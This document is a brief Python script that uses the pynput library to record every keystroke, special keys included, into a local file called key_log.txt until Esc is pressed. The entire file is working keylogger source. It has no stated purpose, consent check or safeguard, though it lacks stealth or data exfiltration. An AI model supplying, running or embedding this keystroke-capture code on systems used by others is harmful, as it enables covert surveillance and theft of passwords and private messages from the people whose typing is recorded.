from pynput import keyboard

# Define a function that handles key presses and writes them to a log file
def on_press(key):
    try:
        # Open the log file in append mode
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open("key_log.txt", "a") as log_file:
            log_file.write(f" [{key}] ")

# Define a function that handles key releases (optional)
def on_release(key):
    # Stop listener on escape key (optional)
    if key == keyboard.Key.esc:
        return False

# Start the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
